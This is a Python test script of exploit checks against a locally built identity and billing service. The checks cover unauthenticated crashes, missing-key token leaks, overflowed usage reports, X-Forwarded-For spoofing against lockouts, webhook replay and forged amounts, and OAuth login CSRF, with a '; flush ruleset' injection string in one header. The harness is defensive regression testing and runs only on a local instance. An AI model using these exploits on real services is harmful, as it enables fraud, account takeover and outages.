#!/usr/bin/env python3
"""Black-box exploit programs for the DCF-ID findings, run against a built binary.

    tests/poc/poc.py PATH/TO/dcf-id [--only I1,I5] [--no-redis]

Every check starts the service fresh (own temp directory, own SQLite file, own
ports), speaks plain HTTP to it, and reads the SQLite file back. Python
standard library only. No network beyond 127.0.0.1 is needed: Discord and
Stripe are never contacted (the Stripe webhook is exercised by signing events
with the same secret the service is given).

Verdicts:  [VULN]  the exploit worked against this binary (exit status 1)
           [ ok ]  the exploit was refused (or, for an R-check, the legitimate
                   path still works)
           [skip]  a precondition (redis-server) is missing

The R-checks are regression guards: they must be [ ok ] on the unmodified code
too, so a green run is not just a service that no longer answers.

The binary needs templates/index.html, which is not in the repository. These
checks read the page for two markers, so build the binary from a scratch copy
whose template is (any markup around)

    {% if let Some(e) = error %}<p>ERROR:{{ e }}</p>{% endif %}
    {% if let Some(u) = user %}<p>USER:{{ u.username }} TOKEN:{{ u.access_token }}</p>{% endif %}

and do not commit it. Needs python3, and redis-server on PATH for the checks
that involve Redis (without it they are [skip]).

This file is part of the repository's tests; it is not used by the service.
"""
import hashlib
import hmac
import http.client
import json
import os
import random
import shutil
import signal
import socket
import sqlite3
import string
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse

WH_SECRET = "whsec_poc_secret_value"
INTERNAL_KEY = "poc-internal-key-0123456789abcdef"
FREE_TIER = 134217728
GIB = 1073741824


# ------------------------------------------------------------------ plumbing
def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def rand_token(n=32):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))


class Refused(Exception):
    def __init__(self, rc, log):
        super().__init__("exited %s before listening" % rc)
        self.rc = rc
        self.log = log


class Redis:
    """a throwaway redis-server, plus a minimal RESP client to look inside it"""

    def __init__(self):
        exe = shutil.which("redis-server")
        if not exe:
            raise FileNotFoundError("redis-server")
        self.dir = tempfile.mkdtemp(prefix="poc-redis-")
        self.port = free_port()
        self.proc = subprocess.Popen(
            [exe, "--port", str(self.port), "--bind", "127.0.0.1", "--save", "", "--appendonly", "no", "--dir", self.dir],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(100):
            try:
                self.cmd("PING")
                return
            except OSError:
                time.sleep(0.05)
        raise RuntimeError("redis-server did not come up")

    def cmd(self, *args):
        s = socket.create_connection(("127.0.0.1", self.port), timeout=5)
        try:
            out = b"*%d\r\n" % len(args)
            for a in args:
                a = a.encode() if isinstance(a, str) else a
                out += b"$%d\r\n%s\r\n" % (len(a), a)
            s.sendall(out)
            f = s.makefile("rb")
            return self._read(f)
        finally:
            s.close()

    def _read(self, f):
        line = f.readline().rstrip(b"\r\n")
        t, rest = line[:1], line[1:]
        if t in (b"+", b"-"):
            return rest.decode()
        if t == b":":
            return int(rest)
        if t == b"$":
            n = int(rest)
            if n < 0:
                return None
            d = f.read(n + 2)[:-2]
            return d.decode(errors="replace")
        if t == b"*":
            return [self._read(f) for _ in range(int(rest))]
        raise RuntimeError("bad RESP %r" % line)

    def stop(self):
        self.proc.terminate()
        try:
            self.proc.wait(3)
        except subprocess.TimeoutExpired:
            self.proc.kill()
        shutil.rmtree(self.dir, ignore_errors=True)


class Svc:
    def __init__(self, binary, redis=None, key=INTERNAL_KEY, allow_open=False, extra_env=None):
        self.binary = binary
        self.dir = tempfile.mkdtemp(prefix="poc-svc-")
        self.port = free_port()
        self.db = os.path.join(self.dir, "id.db")
        env = {
            "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
            "HOME": self.dir,
            "DATABASE_URL": "sqlite:%s?mode=rwc" % self.db,
            "IDENTITY_PORT": str(self.port),
            "STRIPE_SECRET_KEY": "sk_test_poc",
            "STRIPE_WEBHOOK_SECRET": WH_SECRET,
            "DISCORD_CLIENT_ID": "poc-client",
            "DISCORD_CLIENT_SECRET": "poc-secret",
            "BASE_URL": "http://127.0.0.1:%d" % self.port,
            "REDIS_URL": "redis://127.0.0.1:%d" % (redis.port if redis else 1),
            "RUST_LOG": "warn",
            "NO_PROXY": "*", "no_proxy": "*",
        }
        if key:
            env["DCF_ID_INTERNAL_KEY"] = key
        if allow_open:
            env["DCF_ID_ALLOW_OPEN_API"] = "1"
        env.update(extra_env or {})
        self.logf = open(os.path.join(self.dir, "service.log"), "wb")
        self.proc = subprocess.Popen([binary], cwd=self.dir, env=env, stdout=self.logf, stderr=subprocess.STDOUT)

    def start(self, wait=20):
        t0 = time.time()
        while time.time() - t0 < wait:
            rc = self.proc.poll()
            if rc is not None:
                raise Refused(rc, self.log())
            st, _, _ = self.req("GET", "/health", timeout=2)
            if st is not None:
                return self
            time.sleep(0.05)
        raise RuntimeError("service did not listen within %ds: %s" % (wait, self.log()))

    def log(self):
        self.logf.flush()
        try:
            return open(os.path.join(self.dir, "service.log"), errors="replace").read()[-1500:]
        except OSError:
            return ""

    def alive(self):
        return self.proc.poll() is None

    def stop(self):
        if self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(3)
            except subprocess.TimeoutExpired:
                self.proc.kill()
        self.logf.close()
        shutil.rmtree(self.dir, ignore_errors=True)

    # ---- http
    def req(self, method, path, headers=None, body=None, timeout=25):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=timeout)
        try:
            conn.request(method, path, body=body, headers=headers or {})
            r = conn.getresponse()
            data = r.read()
            hdrs = {k.lower(): v for k, v in r.getheaders()}
            hdrs["set-cookie-all"] = r.msg.get_all("Set-Cookie") or []
            return r.status, hdrs, data
        except (OSError, http.client.HTTPException) as e:
            return None, {"set-cookie-all": []}, repr(e).encode()
        finally:
            conn.close()

    def form(self, path, fields, headers=None, **kw):
        h = {"Content-Type": "application/x-www-form-urlencoded"}
        h.update(headers or {})
        return self.req("POST", path, h, urllib.parse.urlencode(fields).encode(), **kw)

    def api(self, method, path, key=INTERNAL_KEY, body=None):
        h = {}
        if key is not None:
            h["X-Internal-Key"] = key
        if body is not None:
            h["Content-Type"] = "application/json"
            body = json.dumps(body).encode() if not isinstance(body, bytes) else body
        return self.req(method, path, h, body)

    # ---- db
    def sql(self, q, args=()):
        c = sqlite3.connect(self.db, timeout=15)
        try:
            cur = c.execute(q, args)
            rows = cur.fetchall()
            c.commit()
            return rows
        finally:
            c.close()

    def seed(self, username, token=None, pw_hash=None, discord_id=None, used=0, bal=0.0, vip=0, ip=None):
        token = token or rand_token()
        self.sql("INSERT INTO users (username, password_hash, access_token, discord_id, data_used, account_balance,"
                 " last_reset_date, last_ip, last_seen, created_at, is_vip) VALUES (?,?,?,?,?,?,?,?,?,?,?)",
                 (username, pw_hash, token, discord_id, used, bal, "2026-01", ip, None, "2026-01-01T00:00:00Z", vip))
        return token

    def balance(self, token):
        return self.sql("SELECT account_balance FROM users WHERE access_token=?", (token,))[0][0]

    def used(self, token):
        return self.sql("SELECT data_used FROM users WHERE access_token=?", (token,))[0][0]


def text(data):
    return data.decode(errors="replace")


def errtext(data):
    t = text(data)
    i = t.find("ERROR:")
    return t[i + 6:].split("<")[0].strip() if i >= 0 else ""


def logged_in(st, hdrs, data):
    return st == 200 and "USER:" in text(data) and any(c.startswith("session=") and len(c.split(";")[0]) > 12
                                                        for c in hdrs["set-cookie-all"])


def register(svc, name, pw="correct-horse-1", headers=None):
    return svc.form("/auth/register", {"username": name, "password": pw}, headers)


def login(svc, name, pw, headers=None):
    return svc.form("/auth/login", {"username": name, "password": pw}, headers)


def stripe_body(evt_id, token, cents=500, dollars="5.00", status="paid", session=None, currency="usd", user_id=None):
    md = {"access_token": token, "amount_dollars": dollars}
    if user_id is not None:
        md["user_id"] = str(user_id)
    return json.dumps({
        "id": evt_id, "object": "event", "type": "checkout.session.completed",
        "data": {"object": {"id": session or ("cs_" + evt_id), "object": "checkout.session", "amount_total": cents,
                            "currency": currency, "payment_status": status, "metadata": md}},
    })


def stripe_header(body, ts=None, secret=WH_SECRET, order=("good",), bad=None):
    ts = int(time.time()) if ts is None else ts
    good = hmac.new(secret.encode(), ("%d.%s" % (ts, body)).encode(), hashlib.sha256).hexdigest()
    badsig = bad or ("0" * 64)
    parts = ["t=%d" % ts]
    for o in order:
        parts.append("v1=" + (good if o == "good" else badsig))
    return ",".join(parts)


def webhook(svc, body, header):
    return svc.req("POST", "/stripe/webhook", {"Stripe-Signature": header, "Content-Type": "application/json"},
                   body.encode())


RESULTS = []


def report(cid, name, verdict, detail=""):
    RESULTS.append((cid, name, verdict, detail))
    tag = {"VULN": "[VULN]", "ok": "[ ok ]", "skip": "[skip]"}[verdict]
    print("%s %-5s %s%s" % (tag, cid, name, (" -- " + detail) if detail else ""), flush=True)


# -------------------------------------------------------------------- checks
def check_I1(binary, redis):
    s = Svc(binary, redis).start()
    try:
        s.seed("discorduser", discord_id="1234567890", pw_hash=None)
        s.seed("normaluser", pw_hash=None)
        st, _, data = login(s, "discorduser", "whatever-12345")
        time.sleep(0.5)
        died = not s.alive()
        rc = s.proc.poll()
        if died:
            report("I1", "login as a password-less (Discord) user kills the process", "VULN",
                   "service exited with status %s after ONE unauthenticated POST /auth/login" % rc)
        else:
            st2, _, _ = s.req("GET", "/health")
            ok = st is not None and "Invalid credentials" in text(data) and st2 == 200
            report("I1", "login as a password-less (Discord) user kills the process", "ok" if ok else "VULN",
                   "service alive, answered %s %r" % (st, text(data)[:60]))
    finally:
        s.stop()


def check_I1b(binary, redis):
    """hardening: the unwrap class. A row whose numeric column holds TEXT (a corrupted or
    hand-edited database) must not take the whole process down with it: release builds
    abort on any panic. Not reachable from the network by itself; see README."""
    died = []
    for col in ("is_vip", "data_used", "account_balance"):
        s = Svc(binary, redis).start()
        try:
            tok = s.seed("typeconf", pw_hash=None, discord_id="55")
            s.sql("UPDATE users SET %s='garbage' WHERE access_token=?" % col, (tok,))
            for label, call in (
                ("verify_token", lambda: s.req("GET", "/api/user/verify", {"Authorization": "Bearer " + tok})),
                ("report_usage", lambda: s.api("POST", "/api/usage/report", body={"access_token": tok, "bytes_used": 5})),
                ("discord lookup", lambda: s.api("GET", "/api/user/discord/55")),
            ):
                call()
                if not s.alive():
                    died.append("%s=text via %s" % (col, label))
                    break
        finally:
            s.stop()
    report("I1b", "a row with TEXT in a numeric column does not abort the service (unwrap hardening)",
           "VULN" if died else "ok", "; ".join(died))


def check_I2a(binary, redis):
    try:
        s = Svc(binary, redis, key=None).start()
    except Refused as r:
        report("I2a", "no DCF_ID_INTERNAL_KEY configured: the service must not run open", "ok",
               "refused to start (exit %s)" % r.rc)
        return
    try:
        s.seed("victim", discord_id="4242", token="V" * 32)
        st, _, data = s.api("GET", "/api/user/discord/4242", key=None)
        leaked = st == 200 and "V" * 32 in text(data)
        report("I2a", "no DCF_ID_INTERNAL_KEY configured: the service must not run open",
               "VULN" if leaked else "ok",
               ("GET /api/user/discord/4242 with no key -> %s and the victim's access_token" % st) if leaked else "")
    finally:
        s.stop()


def check_I2b(binary, redis):
    s = Svc(binary, redis).start()
    try:
        tok = s.seed("victim", discord_id="4242", token="W" * 32, bal=3.0)
        leaks = []
        for path in ("/api/user/discord/4242", "/api/stats", "/metrics"):
            st, _, _ = s.api("GET", path, key=None)
            if st == 200:
                leaks.append(path)
            st, _, _ = s.api("GET", path, key="wrong-" + INTERNAL_KEY)
            if st == 200:
                leaks.append(path + " (wrong key)")
        st, _, _ = s.api("POST", "/api/usage/report", key=None, body={"access_token": tok, "bytes_used": 1})
        if st == 200:
            leaks.append("/api/usage/report")
        report("I2b", "key-protected endpoints refuse a missing or wrong X-Internal-Key",
               "VULN" if leaks else "ok", ("answered 200 without the key: " + ", ".join(leaks)) if leaks else "")
        st1, _, d1 = s.api("GET", "/api/user/discord/4242")
        st2, _, _ = s.api("GET", "/api/stats")
        st3, _, _ = s.api("GET", "/metrics")
        report("R2", "with the right key the API answers (discord lookup, stats, metrics)",
               "ok" if (st1 == 200 and "W" * 32 in text(d1) and st2 == 200 and st3 == 200) else "VULN",
               "%s %s %s" % (st1, st2, st3))
    finally:
        s.stop()


def check_I3(binary, redis):
    s = Svc(binary, redis).start()
    try:
        tok = s.seed("meter", used=1000, bal=5.0)
        findings = []
        st, _, _ = s.api("POST", "/api/usage/report", body={"access_token": tok, "bytes_used": 2**64 - 500})
        after = s.used(tok)
        if after != 1000:
            findings.append("bytes_used=2^64-500 moved data_used 1000 -> %s (HTTP %s)" % (after, st))
        st, _, _ = s.api("POST", "/api/usage/report", body={"access_token": tok, "bytes_used": 2**63 - 1})
        after2 = s.used(tok)
        if after2 not in (1000,):
            findings.append("bytes_used=2^63-1 moved data_used to %s (HTTP %s)" % (after2, st))
        report("I3", "usage report with a huge bytes_used refunds or locks the account",
               "VULN" if findings else "ok", "; ".join(findings))
        tok2 = s.seed("meter2", used=1000, bal=5.0)
        st, _, _ = s.api("POST", "/api/usage/report", body={"access_token": tok2, "bytes_used": 4096})
        report("R3", "an ordinary usage report is added", "ok" if (st == 200 and s.used(tok2) == 1000 + 4096) else "VULN",
               "HTTP %s data_used=%s" % (st, s.used(tok2)))
    finally:
        s.stop()


def check_I4a(binary, redis):
    s = Svc(binary, redis).start()
    try:
        junk = "1.2.3.4; flush ruleset"
        register(s, "spoofer", headers={"X-Forwarded-For": junk})
        row = s.sql("SELECT last_ip FROM users WHERE username='spoofer'")
        ip = row[0][0] if row else None
        report("I4a", "a client-supplied X-Forwarded-For lands unvalidated in users.last_ip",
               "VULN" if ip == junk else "ok", "last_ip=%r" % (ip,))
        register(s, "spoofer2", headers={"X-Forwarded-For": "8.8.8.8"})
        ip2 = s.sql("SELECT last_ip FROM users WHERE username='spoofer2'")[0][0]
        report("I4a2", "an untrusted peer's X-Forwarded-For (a valid address) is not believed",
               "VULN" if ip2 == "8.8.8.8" else "ok", "last_ip=%r" % (ip2,))
    finally:
        s.stop()


def check_I4c(binary, redis):
    """TRUSTED_PROXIES=127.0.0.1: this test client plays the reverse proxy. On a build without the setting
    the first (client-controlled) entry is believed."""
    s = Svc(binary, redis, extra_env={"TRUSTED_PROXIES": "127.0.0.1"}).start()
    try:
        # the client sent "6.6.6.6"; the proxy appended the address it actually saw
        register(s, "viaproxy", headers={"X-Forwarded-For": "6.6.6.6, 198.51.100.9"})
        ip = s.sql("SELECT last_ip FROM users WHERE username='viaproxy'")[0][0]
        report("I4c", "behind a trusted proxy the client is the rightmost untrusted X-Forwarded-For entry, not the first",
               "VULN" if ip != "198.51.100.9" else "ok", "last_ip=%r" % (ip,))
        register(s, "viaproxy2", headers={"X-Forwarded-For": "198.51.100.8, 127.0.0.1"})
        ip = s.sql("SELECT last_ip FROM users WHERE username='viaproxy2'")[0][0]
        report("R4c", "a trusted hop at the end of the chain is skipped", "ok" if ip == "198.51.100.8" else "VULN", "last_ip=%r" % (ip,))
        register(s, "viaproxy3", headers={"X-Forwarded-For": "8.8.8.8, not-an-ip"})
        ip = s.sql("SELECT last_ip FROM users WHERE username='viaproxy3'")[0][0]
        report("I4d", "a non-address in the chain is not stored", "VULN" if ip == "8.8.8.8" or ip == "not-an-ip" else "ok", "last_ip=%r" % (ip,))
    finally:
        s.stop()


def check_I4b(binary, redis):
    if redis is None:
        report("I4b", "cycling X-Forwarded-For defeats the login lockout", "skip", "no redis-server")
        return
    s = Svc(binary, redis).start()
    try:
        register(s, "target1", pw="correct-horse-1")
        locked = 0
        for i in range(12):
            st, _, d = login(s, "target1", "wrong-guess-%d" % i, headers={"X-Forwarded-For": "10.9.%d.%d" % (i, i)})
            if "Too many attempts" in text(d):
                locked += 1
        report("I4b", "cycling X-Forwarded-For defeats the login lockout (12 wrong guesses, one socket)",
               "VULN" if locked == 0 else "ok", "%d of 12 answered 'Too many attempts'" % locked)
    finally:
        s.stop()


def check_I5(binary, redis):
    s = Svc(binary, redis).start()
    try:
        lost_rounds = []
        for rnd in range(4):
            tok = s.seed("racer%d" % rnd, used=FREE_TIER, bal=1000.0)
            n = 40
            expected = 1000.0 + n * 5.0 - n * 0.05
            barrier = threading.Barrier(2 * n)
            errs = []

            def credit(i):
                body = stripe_body("evt_r%d_%d" % (rnd, i), tok)
                barrier.wait()
                st, _, _ = webhook(s, body, stripe_header(body))
                if st != 200:
                    errs.append(("webhook", st))

            def use(i):
                barrier.wait()
                st, _, _ = s.api("POST", "/api/usage/report", body={"access_token": tok, "bytes_used": GIB})
                if st != 200:
                    errs.append(("usage", st))

            ts = [threading.Thread(target=credit, args=(i,)) for i in range(n)] + \
                 [threading.Thread(target=use, args=(i,)) for i in range(n)]
            [t.start() for t in ts]
            [t.join() for t in ts]
            got = s.balance(tok)
            if abs(got - expected) > 0.005 or errs:
                lost_rounds.append("round %d: balance %.4f, expected %.4f (%d request errors)" % (rnd, got, expected, len(errs)))
        report("I5", "concurrent Stripe credits and usage reports lose money",
               "VULN" if lost_rounds else "ok", "; ".join(lost_rounds[:2]))
    finally:
        s.stop()


def check_I6(binary, redis):
    s = Svc(binary, redis).start()
    try:
        tok = s.seed("payer", bal=0.0)
        # a: replay of one signed event
        body = stripe_body("evt_replay_1", tok)
        h = stripe_header(body)
        st1, _, _ = webhook(s, body, h)
        st2, _, _ = webhook(s, body, h)
        bal = s.balance(tok)
        report("R6", "a genuine signed checkout.session.completed credits the account",
               "ok" if (st1 == 200 and bal >= 5.0 - 1e-9) else "VULN", "HTTP %s balance=%s" % (st1, bal))
        report("I6a", "the same signed event delivered twice credits twice",
               "VULN" if bal > 5.0 + 1e-9 else "ok", "after two deliveries balance=%.2f (HTTP %s, %s)" % (bal, st1, st2))
        # b: the credited amount comes from the attacker-influenced metadata, not from Stripe's amount_total
        tok2 = s.seed("payer2", bal=0.0)
        body = stripe_body("evt_amount_1", tok2, cents=250, dollars="99.00")
        webhook(s, body, stripe_header(body))
        bal2 = s.balance(tok2)
        report("I6b", "credit follows metadata.amount_dollars, not Stripe's amount_total",
               "VULN" if abs(bal2 - 2.5) > 1e-6 else "ok", "amount_total=250 metadata=99.00 -> credited %.2f" % bal2)
        # c: unpaid
        tok3 = s.seed("payer3", bal=0.0)
        body = stripe_body("evt_unpaid_1", tok3, status="unpaid")
        webhook(s, body, stripe_header(body))
        bal3 = s.balance(tok3)
        report("I6c", "an unpaid checkout session is credited", "VULN" if bal3 > 0 else "ok", "balance=%.2f" % bal3)
        # d: two v1 entries, the valid one first (secret rotation)
        tok4 = s.seed("payer4", bal=0.0)
        body = stripe_body("evt_rot_1", tok4)
        st, _, _ = webhook(s, body, stripe_header(body, order=("good", "bad")))
        report("I6d", "a header with the valid v1 first and a rotated-out v1 second is refused",
               "VULN" if (st != 200 or s.balance(tok4) < 5.0) else "ok", "HTTP %s balance=%.2f" % (st, s.balance(tok4)))
        # e: a bad signature must still be refused
        tok5 = s.seed("payer5", bal=0.0)
        body = stripe_body("evt_bad_1", tok5)
        st, _, _ = webhook(s, body, stripe_header(body, secret="whsec_wrong"))
        report("R6b", "a wrongly signed event is refused and credits nothing",
               "ok" if (st == 400 and s.balance(tok5) == 0) else "VULN", "HTTP %s balance=%.2f" % (st, s.balance(tok5)))
        # f: stale timestamp
        tok6 = s.seed("payer6", bal=0.0)
        body = stripe_body("evt_stale_1", tok6)
        st, _, _ = webhook(s, body, stripe_header(body, ts=int(time.time()) - 3600))
        report("R6c", "a stale (1 h old) signed event is refused", "ok" if (st == 400 and s.balance(tok6) == 0) else "VULN",
               "HTTP %s" % st)
    finally:
        s.stop()


def check_I7(binary, redis):
    s = Svc(binary, redis).start()
    try:
        outcomes = {}
        for amt in ("NaN", "nan", "inf", "-inf", "1", "101", "2.49", "2.5", "5", "100"):
            st, _, d = s.form("/checkout", {"amount": amt})
            t = text(d)
            outcomes[amt] = "range" if "Amount must be between" in t else ("login" if "Please log in first" in t else "other:%s" % st)
        nan_passed = outcomes["NaN"] != "range" or outcomes["nan"] != "range"
        report("I7", "amount=NaN passes the checkout bound check",
               "VULN" if nan_passed else "ok", "NaN -> %s, nan -> %s" % (outcomes["NaN"], outcomes["nan"]))
        bounds_ok = all(outcomes[a] == "range" for a in ("inf", "-inf", "1", "101", "2.49")) and \
            all(outcomes[a] == "login" for a in ("2.5", "5", "100"))
        report("R7", "$2.50, $5 and $100 pass the bound check; $2.49, $101 and inf do not",
               "ok" if bounds_ok else "VULN", str(outcomes))
    finally:
        s.stop()


def check_I8(binary, redis):
    if redis is None:
        report("I8", "OAuth state is bound to the browser that started the flow", "skip", "no redis-server")
        return
    s = Svc(binary, redis).start()
    try:
        st, h, _ = s.req("GET", "/auth/discord?link_discord=999888777")
        loc = h.get("location", "")
        q = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query)
        state = (q.get("state") or [""])[0]
        cookies = [c.split(";")[0] for c in h["set-cookie-all"]]
        keys = redis.cmd("KEYS", "pendinglink:*") or []
        report("I8b", "GET /auth/discord?link_discord=<id> writes an unauthenticated pending link",
               "VULN" if keys else "ok", "redis keys: %s" % keys)
        # the victim's browser never started the flow: it holds no oauth_state cookie
        st, _, d = s.req("GET", "/auth/callback?code=attackercode&state=" + urllib.parse.quote(state))
        t = text(d)
        accepted_blind = "Invalid or expired OAuth state" not in t
        report("I8a", "a callback carrying someone else's valid state is accepted without the matching cookie",
               "VULN" if accepted_blind else "ok", "answer: %s" % errtext(d))
        # positive control: a fresh flow with its own cookie gets past the state check
        st, h, _ = s.req("GET", "/auth/discord")
        loc = h.get("location", "")
        state2 = (urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).get("state") or [""])[0]
        ck = "; ".join(c.split(";")[0] for c in h["set-cookie-all"])
        st, _, d = s.req("GET", "/auth/callback?code=c&state=" + urllib.parse.quote(state2), {"Cookie": ck})
        t = text(d)
        report("R8", "the browser that started the flow gets past the state check (Discord itself is unreachable here)",
               "ok" if "Invalid or expired OAuth state" not in t else "VULN",
               "answer: %s" % errtext(d))
        # single use: the same cookie and state again
        st, _, d = s.req("GET", "/auth/callback?code=c&state=" + urllib.parse.quote(state2), {"Cookie": ck})
        report("R8b", "a state that was used once is refused the second time",
               "ok" if "Invalid or expired OAuth state" in text(d) else "VULN", "answer: %s" % errtext(d))
        # login CSRF with a victim who has started a flow of their own: attacker's valid state in the URL,
        # the victim's cookie holds a different state
        st, h, _ = s.req("GET", "/auth/discord")                 # the attacker's flow
        attacker_state = (urllib.parse.parse_qs(urllib.parse.urlparse(h.get("location", "")).query).get("state") or [""])[0]
        st, h, _ = s.req("GET", "/auth/discord")                 # the victim's own flow
        victim_cookie = "; ".join(c.split(";")[0] for c in h["set-cookie-all"])
        st, _, d = s.req("GET", "/auth/callback?code=attackercode&state=" + urllib.parse.quote(attacker_state), {"Cookie": victim_cookie})
        report("I8c", "the attacker's valid state is accepted although the victim's cookie holds a different state",
               "VULN" if "Invalid or expired OAuth state" not in text(d) else "ok", "answer: %s" % errtext(d))
    finally:
        s.stop()


def check_I9(binary, redis):
    s = Svc(binary, redis).start()
    try:
        homoglyph = "аdmin"      # Cyrillic a + "dmin"
        st, h, d = register(s, "admin")
        st2, h2, d2 = register(s, homoglyph)
        report("I9a", "a Cyrillic look-alike of an existing username registers as a second account",
               "VULN" if logged_in(st2, h2, d2) else "ok", "register(%r) -> %s" % (homoglyph, errtext(d2) or "logged in"))
        digits = "٣٣٣"     # Arabic-Indic digits
        st3, h3, d3 = register(s, digits)
        report("I9a2", "Arabic-Indic digits are accepted as 'alphanumeric' in a username",
               "VULN" if logged_in(st3, h3, d3) else "ok", "")
        r1 = register(s, "Alice99")
        r2 = register(s, "alice99")
        report("I9b", "usernames differing only in case are two accounts",
               "VULN" if (logged_in(*r1) and logged_in(*r2)) else "ok",
               "Alice99 -> %s, alice99 -> %s" % ("ok" if logged_in(*r1) else "refused", "ok" if logged_in(*r2) else "refused"))
        long_pw = "p" * 5000
        r3 = register(s, "longpass", pw=long_pw)
        report("I9c", "a 5000-byte password is hashed", "VULN" if logged_in(*r3) else "ok", "")
        r = register(s, "plainuser", pw="correct-horse-1")
        l = login(s, "plainuser", "correct-horse-1")
        sess = [c.split(";")[0] for c in l[1]["set-cookie-all"] if c.startswith("session=")]
        idx = s.req("GET", "/", {"Cookie": sess[0]}) if sess else (None, {}, b"")
        flags = " ".join(l[1]["set-cookie-all"]).lower()
        ok = logged_in(*r) and logged_in(*l) and "USER:plainuser" in text(idx[2]) if redis else logged_in(*r) and logged_in(*l)
        report("R9", "register, then log in with the right password (HttpOnly cookie%s)" %
               (", dashboard via the session" if redis else ""),
               "ok" if (ok and "httponly" in flags) else "VULN", "")
        bad = login(s, "plainuser", "wrong-password")
        report("R9b", "a wrong password is refused", "ok" if (not logged_in(*bad) and "Invalid credentials" in text(bad[2])) else "VULN", "")
    finally:
        s.stop()


def check_I9d(binary, redis):
    s = Svc(binary, redis).start()
    try:
        ok = 0
        for i in range(30):
            r = register(s, "bulk%03d" % i)
            ok += logged_in(*r)
        report("I9d", "POST /auth/register has no throttle (30 accounts from one socket in a row)",
               "VULN" if ok > 15 else "ok", "%d of 30 registered" % ok)
    finally:
        s.stop()


def check_I9e(binary, redis):
    # Redis deliberately unreachable
    s = Svc(binary, None).start()
    try:
        register(s, "bruteme", pw="correct-horse-1")
        locked = 0
        for i in range(15):
            st, _, d = login(s, "bruteme", "guess-%d" % i)
            locked += "Too many attempts" in text(d)
        st, h, d = login(s, "bruteme", "correct-horse-1")
        report("I9e", "with Redis down the login lockout fails open (15 wrong guesses, then the right one)",
               "VULN" if locked == 0 else "ok",
               "%d of 15 answered 'Too many attempts'; right password afterwards -> %s" % (locked, "accepted" if logged_in(st, h, d) else "refused"))
    finally:
        s.stop()


def check_I10(binary, redis):
    s = Svc(binary, redis).start()
    try:
        st, h, _ = s.req("GET", "/")
        want = {"x-content-type-options": "nosniff", "x-frame-options": "DENY", "referrer-policy": "no-referrer"}
        missing = [k for k, v in want.items() if h.get(k, "").lower() != v.lower()]
        if "no-store" not in h.get("cache-control", ""):
            missing.append("cache-control: no-store")
        report("I10a", "security headers on the dashboard", "VULN" if missing else "ok",
               ("missing: " + ", ".join(missing)) if missing else "")
        st, h, d = s.req("GET", "/health")
        extra = [k for k in ("uptime_secs", "redis_ok", "version") if k in text(d)]
        report("I10b", "/health discloses uptime, redis state and version to anyone",
               "VULN" if extra else "ok", ("fields: " + ", ".join(extra)) if extra else "")
        st, _, d = s.req("GET", "/health")
        report("R10", "/health stays open and says whether the service is up", "ok" if (st == 200 and "status" in text(d)) else "VULN", "")
    finally:
        s.stop()


CHECKS = [
    ("I1", check_I1), ("I1b", check_I1b), ("I2a", check_I2a), ("I2b", check_I2b), ("I3", check_I3),
    ("I4a", check_I4a), ("I4c", check_I4c), ("I4b", check_I4b), ("I5", check_I5), ("I6", check_I6), ("I7", check_I7),
    ("I8", check_I8), ("I9", check_I9), ("I9d", check_I9d), ("I9e", check_I9e), ("I10", check_I10),
]


def main():
    args = sys.argv[1:]
    if not args:
        print(__doc__)
        return 2
    binary = os.path.abspath(args[0])
    only = None
    use_redis = True
    for i, a in enumerate(args[1:], 1):
        if a == "--only":
            only = set(args[i + 1].split(","))
        if a == "--no-redis":
            use_redis = False
    redis = None
    if use_redis:
        try:
            redis = Redis()
        except FileNotFoundError:
            print("note: redis-server not found; Redis-dependent checks are skipped", flush=True)
    try:
        for cid, fn in CHECKS:
            if only and cid not in only:
                continue
            try:
                if redis:
                    redis.cmd("FLUSHALL")   # every check starts with no lockouts and no counters
                fn(binary, redis)
            except Refused as r:
                report(cid, fn.__name__, "ok", "service refused to start: exit %s: %s" % (r.rc, r.log.strip()[-200:]))
            except Exception as e:  # a harness error is not a verdict
                print("[ERR ] %-5s %s: %r" % (cid, fn.__name__, e), flush=True)
                RESULTS.append((cid, fn.__name__, "error", repr(e)))
    finally:
        if redis:
            redis.stop()
    vuln = [r for r in RESULTS if r[2] == "VULN"]
    err = [r for r in RESULTS if r[2] == "error"]
    print("\n%d checks: %d ok, %d VULN, %d skipped, %d harness errors" % (
        len(RESULTS), sum(r[2] == "ok" for r in RESULTS), len(vuln), sum(r[2] == "skip" for r in RESULTS), len(err)))
    return 1 if (vuln or err) else 0


if __name__ == "__main__":
    sys.exit(main())
